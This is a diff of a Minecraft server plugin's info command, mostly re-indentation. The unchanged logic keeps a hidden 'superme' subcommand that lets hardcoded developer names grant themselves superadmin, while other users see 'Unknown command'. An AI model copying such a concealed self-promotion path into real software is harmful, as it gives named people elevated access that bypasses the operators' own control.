@@ -12,32 +12,35 @@ import org.bukkit.entity.Player;
 @CommandParameters(description = "Shows information about FreedomOpMod", usage = "/<command>")
 public class Command_fom extends TFM_Command
 {
-  public boolean run(CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole)
-  {
-    if (args.length == 0)
+    public boolean run(CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole)
     {
-      playerMsg("FreedomOpMod for 'FreedomOp', an associated all-op server.", ChatColor.GOLD);
-      playerMsg(String.format("Version " + ChatColor.BLUE + "%s.%s" + ChatColor.BLUE + ", built %s.", new Object[] { TotalFreedomMod.pluginVersion, TotalFreedomMod.buildNumber, TotalFreedomMod.buildDate }), ChatColor.GOLD);
-      playerMsg("Created by Madgeek1450 and DarthSalamon (later worked on by Buildcarter8, Robo_Lord and SupItsDillon", ChatColor.GOLD);
-      playerMsg("Visit " + ChatColor.AQUA + "http://freedomop.boards.net/" + ChatColor.GREEN + " for more information.", ChatColor.GREEN);
-    }
-    else if (args.length == 1)
-    {
-     if (TFM_Util.DEVELOPERS.contains(sender.getName()))
-      {
-        if (args[0].equals("superme"))
+        if (args.length == 0)
         {
-          TFM_Util.adminAction("FreedomOPMod",  "Adding "  + sender.getName() + " to the superadmin config.", true);
-          TFM_AdminList.addSuperadmin(sender_p);
-          return true;
+            playerMsg("FreedomOpMod for 'FreedomOp', an associated all-op server.", ChatColor.GOLD);
+            playerMsg(String.format("Version " + ChatColor.BLUE + "%s.%s" + ChatColor.BLUE + ", built %s.", new Object[]
+            {
+                TotalFreedomMod.pluginVersion, TotalFreedomMod.buildNumber, TotalFreedomMod.buildDate
+            }), ChatColor.GOLD);
+            playerMsg("Created by Madgeek1450 and DarthSalamon (later worked on by Buildcarter8, Robo_Lord and SupItsDillon", ChatColor.GOLD);
+            playerMsg("Visit " + ChatColor.AQUA + "http://freedomop.boards.net/" + ChatColor.GREEN + " for more information.", ChatColor.GREEN);
         }
-      }
-     else
-      {
-        playerMsg("Unknown command. Type \"/help\"/ for help");
+        else if (args.length == 1)
+        {
+            if (TFM_Util.DEVELOPERS.contains(sender.getName()))
+            {
+                if (args[0].equals("superme"))
+                {
+                    TFM_Util.adminAction("FreedomOPMod", "Adding " + sender.getName() + " to the superadmin config.", true);
+                    TFM_AdminList.addSuperadmin(sender_p);
+                    return true;
+                }
+            }
+            else
+            {
+                playerMsg("Unknown command. Type \"/help\"/ for help");
+                return true;
+            }
+        }
         return true;
-      }
     }
-    return true;
-  }
 }
